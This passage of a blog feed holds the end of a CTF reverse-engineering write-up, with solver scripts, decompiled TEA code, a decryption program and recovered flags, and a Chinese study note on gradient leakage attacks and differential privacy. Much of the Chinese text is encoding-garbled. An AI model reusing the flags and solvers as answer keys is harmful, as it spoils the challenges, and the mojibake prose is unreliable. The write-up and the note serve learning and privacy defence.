&lt;&lt; (8 - dword_60004040));</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="built_in">input</span>[i]=cipher[i]&lt;&lt;<span class="number">3</span>&amp;<span class="number">0xff</span>|(cipher[i]&gt;&gt;<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">input</span>]))</span><br><span class="line"><span class="comment"># flag&#123;Do_you_really_know_ptrace?&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h3><p>ä¸‹ä¸‹æ¥å°±æ²¡UPXå£³ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒRC4åŠ¨è°ƒä¸€ä¸‹å°±è¡Œã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do_you_know_UPX?&#125;</span><br></pre></td></tr></table></figure></p><h3 id="drink-tea"><a href="#drink-tea" class="headerlink" title="drink_tea"></a>drink_tea</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001180</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">char</span> *WelcomeToNewStar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 n4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 -= <span class="number">0x61C88647</span>;</span><br><span class="line">    v3 += (*(WelcomeToNewStar + <span class="number">1</span>) + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v4) ^ (*WelcomeToNewStar + <span class="number">16</span> * v4);</span><br><span class="line">    v4 += (*(WelcomeToNewStar + <span class="number">3</span>) + (v3 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v3) ^ (*(WelcomeToNewStar + <span class="number">2</span>) + <span class="number">16</span> * v3);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  n4 = <span class="number">4LL</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> n4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®ä¸€ä¸‹<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001180</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 n4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint32_t</span> v0; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="type">uint32_t</span> v1; <span class="comment">// [rsp+4h] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = *v;</span><br><span class="line">  v1 = v[<span class="number">1</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">    v0 += (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum + v1) ^ (*k + <span class="number">16</span> * v1);</span><br><span class="line">    v1 += (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum + v0) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * v0);</span><br><span class="line">  &#125;</span><br><span class="line">  *v = v0;</span><br><span class="line">  n4 = <span class="number">4LL</span>;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="keyword">return</span> n4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>exp:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_enc</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;              </span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x61C88647</span>;     </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123; </span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_dec</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];  </span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x61C88647</span>; </span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">-32</span> * delta;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;  </span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum += delta ;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å¿…é¡»ä¿®æ­£ä¸ºæ­£ç¡®é«˜ä½ä½é¡ºåº</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">0xb3f72078</span>, <span class="number">0xdace42c5</span>&#125;, </span><br><span class="line">    &#123;<span class="number">0x1a215985</span>, <span class="number">0x595a5626</span>&#125;, </span><br><span class="line">    &#123;<span class="number">0xed0d0229</span>, <span class="number">0xeeb9a807</span>&#125;, </span><br><span class="line">    &#123;<span class="number">0x87115936</span>, <span class="number">0x24235cfd</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>]=&#123;<span class="number">0x636c6557</span>, <span class="number">0x54656d6f</span>, <span class="number">0x77654e6f</span>, <span class="number">0x72617453</span>&#125;; <span class="comment">// WelcomeToNewStar</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">tea_dec</span>(v[i], k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, v[i][<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, v[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 67616c666568547b525f65724145545f4554585f6e615f4158585f647d414554</span></span><br><span class="line"><span class="comment">// galfehT&#123;R_erAET_ETX_na_AXX_d&#125;AET</span></span><br><span class="line"><span class="comment">// flag&#123;There_R_TEA_XTEA_and_XXTEA&#125;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¢¯åº¦æ³„éœ²æ”»å‡»</title>
      <link href="/2025/10/27/%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/"/>
      <url>/2025/10/27/%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>é˜…è¯»ç¬”è®°</p><h1 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h1><h2 id="1ã€æ·±åº¦ç¥ç»ç½‘ç»œï¼ˆDNNsï¼‰é¢ä¸´çš„ä¸¤ä¸ªé—®é¢˜ï¼š"><a href="#1ã€æ·±åº¦ç¥ç»ç½‘ç»œï¼ˆDNNsï¼‰é¢ä¸´çš„ä¸¤ä¸ªé—®é¢˜ï¼š" class="headerlink" title="1ã€æ·±åº¦ç¥ç»ç½‘ç»œï¼ˆDNNsï¼‰é¢ä¸´çš„ä¸¤ä¸ªé—®é¢˜ï¼š"></a>1ã€æ·±åº¦ç¥ç»ç½‘ç»œï¼ˆDNNsï¼‰é¢ä¸´çš„ä¸¤ä¸ªé—®é¢˜ï¼š</h2><p>ï¼ˆiï¼‰å¦‚ä½•åœ¨ä¸€ä¸ªç§å¯†æ•æ„Ÿæ•°æ®çš„é›†åˆä¸Šè®­ç»ƒæ¨¡å‹ï¼Œä»¥ä¾¿èƒ½å¤Ÿ<strong>å®‰å…¨éƒ¨ç½²</strong>ï¼ŒåŒæ—¶<strong>æœ€å¤§é™åº¦åœ°å‡å°‘æ•æ„Ÿè®­ç»ƒæ•°æ®çš„æŠ«éœ²</strong>ï¼Ÿ</p><p>ï¼ˆiiï¼‰ä½¿ç”¨å·®åˆ†éšç§è®­ç»ƒçš„ DNN æ¨¡å‹èƒ½å¦è¢«ä¿¡ä»»ï¼Œä»¥<strong>é˜²æ­¢å…¶è¾“å‡ºä¾µçŠ¯éšç§</strong>ï¼Ÿ</p><h2 id="2ã€æ·±åº¦å­¦ä¹ çš„éšç§é£é™©"><a href="#2ã€æ·±åº¦å­¦ä¹ çš„éšç§é£é™©" class="headerlink" title="2ã€æ·±åº¦å­¦ä¹ çš„éšç§é£é™©"></a>2ã€æ·±åº¦å­¦ä¹ çš„éšç§é£é™©</h2><p>æ·±åº¦å­¦ä¹ åœ¨è®­ç»ƒé˜¶æ®µå’Œé¢„æµ‹é˜¶æ®µéƒ½<strong>å®¹æ˜“å—åˆ°å¤šç§éšç§æ”»å‡»</strong>ï¼Œè¿™äº›æ”»å‡»åˆ©ç”¨äº†å…¶åºå¤§çš„æ¨¡å‹å‚æ•°æ•°é‡ï¼Œè¿™äº›å‚æ•°è¶³ä»¥ç¼–ç ä¸ªäººæ•°æ®çš„ç»†èŠ‚ã€‚åœ¨æ¨¡å‹è®­ç»ƒè¿‡ç¨‹ä¸­å¯ä»¥æ— å£°åœ°ä½¿ç”¨ç›¸åŒçš„ç›‘è§†è¿‡ç¨‹å’Œæœªç»æˆæƒçš„è¯»å–æ“ä½œè€Œä¸è¢«å‘ç°ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ç›¸åŒçš„é‡å»ºç®—æ³•<strong>ä»æ³„éœ²çš„æ¢¯åº¦ä¸­æŠ«éœ²ç§äººè®­ç»ƒæ•°æ®</strong>ã€‚</p><h2 id="3ã€å·®åˆ†éšç§æ·±åº¦å­¦ä¹ "><a href="#3ã€å·®åˆ†éšç§æ·±åº¦å­¦ä¹ " class="headerlink" title="3ã€å·®åˆ†éšç§æ·±åº¦å­¦ä¹ "></a>3ã€å·®åˆ†éšç§æ·±åº¦å­¦ä¹ </h2><blockquote><p><strong>å·®åˆ†éšç§:</strong> å·®åˆ†éšç§æ˜¯ä¸€ç§æ•°å­¦æ¡†æ¶ï¼Œç”¨äºç¡®ä¿æ•°æ®é›†ä¸­ä¸ªäººçš„éšç§ã€‚å®ƒé€šè¿‡å…è®¸å¯¹æ•°æ®è¿›è¡Œåˆ†æè€Œä¸æ³„éœ²æ•°æ®é›†ä¸­ä»»ä½•ä¸ªäººçš„æ•æ„Ÿä¿¡æ¯ï¼Œä»è€Œæä¾›äº†å¼ºæœ‰åŠ›çš„éšç§ä¿è¯ã€‚</p><blockquote><p>ç®€å•çš„ä¾‹å­ï¼šæœ‰ä¸€ä¸ªæ‘åº„é‡Œä¸€å…±æœ‰100äººï¼Œä»–ä»¬åˆ†åˆ«ä¸æ˜¯æ‹¥æœ‰è“çœ¼ç›å°±æ˜¯æ‹¥æœ‰é»„çœ¼ç›çš„äººï¼Œæˆ‘ä»¬é¦–å…ˆæŸ¥è¯¢è¿™ä¸€ç™¾ä¸ªäººåˆ†åˆ«æœ‰å¤šå°‘ä¸ªé»„çœ¼ç›çš„ï¼Œå¾—åˆ°å›ç­”ï¼š10äººï¼›ç„¶åæŸ¥è¯¢é™¤äº†å°Aä»¥å¤–æœ‰å¤šå°‘é»„çœ¼ç›çš„ï¼Œå¾—åˆ°49äººï¼Œè¿™æ—¶å€™å°Açš„éšç§å°±æ³„éœ²äº†ã€‚è€Œç”¨äº†å·®åˆ†éšç§ä»¥åï¼ŒæŸ¥è¯¢è¿™ä¸€ç™¾ä¸ªäººåˆ†åˆ«æœ‰å¤šå°‘ä¸ªé»„çœ¼ç›çš„ï¼Œå¾—åˆ°å›ç­”ï¼š10%ï¼›æ’é™¤å°Aä»¥åæŸ¥è¯¢ï¼Œå¾—åˆ°å›ç­”ï¼š9.09%</p></blockquote><p>å·®åˆ†éšç§ï¼šè®¾ğ’Ÿä¸ºå¯èƒ½çš„è¾“å…¥æ•°æ®åŸŸï¼Œâ„›ä¸ºæ‰€æœ‰å¯èƒ½è¾“å‡ºçš„èŒƒå›´ã€‚éšæœºæœºåˆ¶â„³:ğ’Ÿâ†’â„›æ»¡è¶³(Ïµ,Î´)-å·®åˆ†éšç§ï¼Œå¦‚æœå¯¹äºä»»æ„ä¸¤ä¸ªä»…æœ‰ä¸€ä¸ªæ¡ç›®ä¸åŒçš„è¾“å…¥é›†AâŠ†ğ’Ÿå’ŒAâ€²âŠ†ğ’Ÿï¼š$â€–Aâˆ’Aâ€²â€–0=1$ï¼Œæ–¹ç¨‹ 1 åœ¨0â‰¤Î´<1å’ŒÏµ>0ä¸‹æˆç«‹ã€‚$Prâ¡(â„³(A)âˆˆâ„›)â‰¤eÏµPrâ¡(â„³(Aâ€²)âˆˆâ„›)+Î´.$</p><blockquote><p>è¿™ä¸ªå®šä¹‰æŒ‡å‡ºï¼Œç»™å®šÎ´ï¼Œä¸€ä¸ªæ›´å°çš„Ïµå°†è¡¨æ˜â„³(A)çš„è¾“å‡ºå’Œâ„³(Aâ€²)è¾“å‡ºä¹‹é—´çš„å·®å¼‚æ›´å°ã€‚(Ïµ,Î´)-å·®åˆ†éšç§ç¡®ä¿å¯¹äºä»»ä½•ç›¸é‚»çš„A,Aâ€²ï¼Œéšç§æŸå¤±çš„ç»å¯¹å€¼è¢«Ïµçš„æ¦‚ç‡è‡³å°‘ä¸º1âˆ’Î´ã€‚å½“0â‰¤Î´&lt;1æ—¶ï¼Œè¿™ä¸ªå®šä¹‰æ„å‘³ç€è§‚å¯Ÿåˆ°çš„Aâ€²çš„è¾“å‡ºæœ€æœ‰å¯èƒ½ä¸å…¶ç›¸é‚»è¾“å…¥Açš„è¾“å‡ºç›¸ä¼¼ï¼›è€Œå½“Î´=0æ—¶ï¼Œå®ƒè¡¨æ˜åœ¨Aâ€²ä¸‹è§‚å¯Ÿåˆ°çš„è¾“å‡ºé«˜åº¦å¯èƒ½ä¹Ÿåœ¨ä¸‹è¢«è§‚å¯Ÿåˆ°ã€‚ç”±äºÎ´æ˜¯æ‰“ç ´Ïµ-å·®åˆ†éšç§çš„ä¸Šé™æ¦‚ç‡ï¼Œå› æ­¤å¸Œæœ›Î´æ›´å°ã€‚</p></blockquote></blockquote><p>å·®åˆ†éšç§æ·±åº¦å­¦ä¹ æ˜¯å‘å¸ƒå…·æœ‰å¯è¯æ˜éšç§ä¿è¯çš„ DNN æ¨¡å‹çš„å®é™…æ ‡å‡†ï¼š<strong>å¯¹äºä½¿ç”¨ä¸¤ä¸ªæœ€å¤šç›¸å·®ä¸€ä¸ªå…ƒç´ çš„ç›¸é‚»è¾“å…¥è®­ç»ƒçš„ä»»ä½•ä¸¤ä¸ªæ¨¡å‹ï¼Œæéš¾æè¿°å…¶è¾“å‡ºå·®å¼‚ã€‚</strong></p><p>æ¢å¥è¯è¯´ï¼Œä»…é€šè¿‡è§‚å¯Ÿä½¿ç”¨å·®åˆ†éšç§å­¦ä¹ ç®—æ³•è®­ç»ƒçš„ DNN æ¨¡å‹çš„è¾“å‡ºï¼Œ<strong>æ— æ³•åˆ¤æ–­æ˜¯å¦ä½¿ç”¨äº†å•ä¸ªç¤ºä¾‹è¿›è¡Œè®­ç»ƒ</strong>ã€‚[M. Abadi, A. Chu, I. Goodfellow, H. B. McMahan, I. Mironov, K. Talwar, and L. Zhang, â€œDeep learning with differential privacy,â€ in <em>CCS</em>.   ACM, 2016, pp. 308â€“318.]é¦–æ¬¡<strong>ä½¿ç”¨çŸ©ä¼šè®¡æ–¹æ³•å®ç°äº†å·®åˆ†éšç§æ·±åº¦å­¦ä¹ </strong>ï¼Œåœ¨éšæœºé‡‡æ ·ä¸‹å®ç°äº†æ›´ä¸¥æ ¼çš„éšç§ä¼šè®¡ã€‚</p><p>ä¸ºäº†è°ƒèŠ‚æ¨¡å‹åœ¨ä¸¤ä¸ªç›¸é‚»è¾“å…¥ä¸‹çš„æœ€å¤§å½±å“ï¼Œä¼ ç»Ÿæ–¹æ³•é€šè¿‡é¦–å…ˆ<strong>è£å‰ªæ¢¯åº¦</strong>ï¼Œç„¶ååº”ç”¨<strong>å·®åˆ†éšç§æ§åˆ¶çš„å™ªå£°æ¥æ‰°åŠ¨æ¢¯åº¦</strong>ï¼Œåœ¨ä½¿ç”¨éšæœºæ¢¯åº¦ä¸‹é™ï¼ˆSGDï¼‰ç®—æ³•ä¹‹å‰ï¼Œç¡®ä¿<strong>æ¯ä¸ªæ¢¯åº¦ä¸‹é™æ­¥éª¤éƒ½æ˜¯å·®åˆ†éšç§çš„</strong>ã€‚ åŸºäºå·®åˆ†éšç§ç®—æ³•çš„ç»„åˆç‰¹æ€§ï¼Œåœ¨å®Œæˆæ‰€æœ‰è®­ç»ƒæ­¥éª¤åç”Ÿæˆçš„æœ€ç»ˆæ¨¡å‹æä¾›äº†ä¸€å®šç¨‹åº¦çš„å·®åˆ†éšç§ã€‚</p><h1 id="æ¢¯åº¦æ³„éœ²å¨èƒæ¨¡å‹"><a href="#æ¢¯åº¦æ³„éœ²å¨èƒæ¨¡å‹" class="headerlink" title="æ¢¯åº¦æ³„éœ²å¨èƒæ¨¡å‹"></a><strong>æ¢¯åº¦æ³„éœ²å¨èƒæ¨¡å‹</strong></h1><p>æ¢¯åº¦æ³„éœ²æ”»å‡»æ˜¯æ·±åº¦å­¦ä¹ èƒŒæ™¯ä¸‹æœ€ç›¸å…³çš„éšç§å¨èƒï¼Œå…¶ä¸­å¥½å¥‡æˆ–æ¶æ„çš„å†…éƒ¨äººå‘˜å¯èƒ½å¯¹æ¢¯åº¦è¿›è¡Œæœªç»æˆæƒçš„è¯»å–ï¼Œå¹¶æ ¹æ®<strong>é€šè¿‡ç›‘è§†æ¯ä¸€æ­¥ SGD è¿­ä»£ä¸­ä½¿ç”¨çš„é€å±‚æ¢¯åº¦è·å¾—çš„æ¢¯åº¦æ¥é‡å»ºç§æœ‰è®­ç»ƒæ•°æ®</strong>ã€‚</p><p>æ­¤ç±»å†…éƒ¨å¨èƒ<strong>ä¸ä¼šç›´æ¥æŸå®³è®­ç»ƒæ¨¡å‹çš„å‡†ç¡®æ€§</strong>ï¼Œå› æ­¤é€šè¿‡ååº”æ€§é˜²å¾¡æ–¹æ³•æ›´éš¾æ£€æµ‹å’Œç¼“è§£ã€‚æˆ‘ä»¬è®¤ä¸ºï¼Œå…·æœ‰å·®åˆ†éšç§çš„æ·±åº¦å­¦ä¹ æ–¹æ³•å¯ä»¥æ„å»ºå‡ºå¯¹æŠ—æ­¤ç±»å¨èƒçš„æœ€ä½³é˜²å¾¡æ–¹æ³•ä¹‹ä¸€ã€‚</p><p>æˆ‘ä»¬çš„å¨èƒæ¨¡å‹å¯¹å†…éƒ¨å¯¹æ‰‹åšå‡ºä»¥ä¸‹<strong>å‡è®¾</strong>ï¼š</p><p>(1)å†…éƒ¨å¯¹æ‰‹åœ¨è®­ç»ƒä¹‹å‰æ— æ³•è·å¾—åŠ å¯†çš„è®­ç»ƒæ•°æ®ï¼›</p><p>(2)å†…éƒ¨å¯¹æ‰‹æ— æ„æŸå®³è®­ç»ƒè¿‡ç¨‹æˆ–è®­ç»ƒæ¨¡å‹çš„å“è´¨ï¼›</p><p>(3)å†…éƒ¨å¯¹æ‰‹å¯èƒ½è·å¾—ä¸­é—´æ¨¡å‹è®­ç»ƒå‚æ•°ï¼Œè¿™äº›å‚æ•°é€šå¸¸è¢«ä¿å­˜ä¸ºæ£€æŸ¥ç‚¹æ•°æ®ï¼Œä»¥å…è®¸ä»ç»™å®šæ­¥éª¤æ¢å¤è¿­ä»£è®­ç»ƒã€‚ </p><p><strong>æ¢¯åº¦æ³„éœ²æ”»å‡»ä¸éœ€è¦ä»»ä½•å…³äº DNN è®­ç»ƒç®—æ³•çš„å…ˆéªŒçŸ¥è¯†</strong>ï¼Œå®ƒ<strong>ä»…åˆ©ç”¨æ³„éœ²çš„æ¢¯åº¦ä¸Šçš„ç‹¬ç«‹é‡å»ºç®—æ³•</strong>æ¥<strong>æ¨æ–­å¹¶æŠ«éœ²ç§æœ‰è®­ç»ƒæ•°æ®</strong>ï¼ŒåŒæ—¶ä¿æŒè®­ç»ƒçš„å®Œæ•´æ€§ã€‚</p><h1 id="æ–‡çŒ®"><a href="#æ–‡çŒ®" class="headerlink" title="æ–‡çŒ®"></a>æ–‡çŒ®</h1><p><a href="https://ar5iv.labs.arxiv.org/html/2112.13178?_immersive_translate_auto_translate=1">M. Fredrikson, S. Jha, and T. Ristenpart, â€œModel inversion attacks that exploit confidence information and basic countermeasures,â€ in CCS.   ACM, 2015, pp. 1322â€“1333</a></p><p><a href="https://arxiv.org/abs/1906.08935">L. Zhu, Z. Liu, and S. Han, â€œDeep leakage from gradients,â€ in <em>NeurIPS</em>, 2019, pp. 14â€‰747â€“14â€‰756.</a><br><a href="https://arxiv.org/abs/2001.02610">B. Zhao, K. R. Mopuri, and H. Bilen, â€œidlg: Improved deep leakage from gradients,â€ <em>arXiv preprint arXiv:2001.02610</em>, 2020.</a><br>Deep Leakage from Gradients<br><a href="https://arxiv.org/abs/2003.14053">J. Geiping, H. Bauermeister, H. DrÃ¶ge, and M. Moeller, â€œInverting gradients - how easy is it to break privacy in federated learning?â€ in <em>NeurIPS</em>, 2020, pp. 16â€‰937â€“16â€‰947.</a><br><a href="https://arxiv.org/abs/2010.07733">J. Zhu and M. Blaschko, â€œR-gap: Recursive gradient attack on privacy,â€ <em>arXiv preprint arXiv:2010.07733</em>, 2020.</a><br><a href="https://arxiv.org/abs/2104.07586">H. Yin, A. Mallya, A. Vahdat, J. M. Alvarez, J. Kautz, and P. Molchanov, â€œSee through gradients: Image batch recovery via gradinversion,â€ in <em>CVPR</em>.   IEEE, 2021.</a><br><a href="https://arxiv.org/abs/2004.10397">W. Wei, L. Liu, M. Loper, K.-H. Chow, M. E. Gursoy, S. Truex, and Y. Wu, â€œA framework for evaluating client privacy leakages in federated learning,â€ in <em>ESORICS</em>.   Springer, 2020, pp. 545â€“566.</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AIå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯ 2025 WriteUp + å¤ç°ing</title>
      <link href="/2025/10/20/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
      <url>/2025/10/20/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
      
